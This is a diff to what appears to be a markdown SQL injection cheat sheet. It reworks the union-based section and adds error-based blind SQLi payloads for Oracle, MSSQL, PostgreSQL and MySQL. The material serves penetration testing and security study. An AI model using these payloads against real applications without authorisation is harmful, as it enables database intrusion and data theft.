@@ -35,7 +35,7 @@ HQL does not support comments
 ```
 
 ## Union Based SQL Injection
-> If you can see the output of your SQL query then this is the best way to exploit it
+If you can see the output of your SQL query then this is the best way to exploit it
 
 **Determine number of columns:**
 ```sql
@@ -45,13 +45,13 @@ HQL does not support comments
 ```sql
 '' UNION SELECT null, null... FROM dual -- 
 ```
-**Get database version**:
+**Get database versions**:
 ```sql
-MySQL, Microsoft
+--MySQL, Microsoft
 SELECT @@version
-PostgreSQL
+--PostgreSQL
 SELECT version()
-Oracle
+--Oracle
 SELECT banner FROM v$version
 SELECT version FROM v$instance
 ```
@@ -59,8 +59,26 @@ SELECT version FROM v$instance
 
 
 ## Blind SQLi
-If you cant see the output of your SQL query then this is the way to go ╰(*°▽°*)╯
+If you cant see the output of your query then try these （￣︶￣）↗　
 
+#### Check your query triggers an error response from the application
+*These are not copy-pastable , you'll need to modify them to fit your already-working injection*
+**Oracle:**
+```sql
+SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)
+```
+**MSQL:**
+```sql
+SELECT CASE WHEN (1=2) THEN 1/0 ELSE NULL END
+```
+**PostgreSQL:**
+```sql
+1 = (SELECT CASE WHEN (1=2) THEN CAST(1/0 AS INTEGER) ELSE NULL END)
+```
+**MySQL:**
+```sql
+SELECT IF(1=2,(SELECT table_name FROM information_schema.tables),'a')
+```
 
 **If it does not seem to return specific results depending on your injection...**
 - ...and it does not seem to be modifying the response of the application in any way, check out 
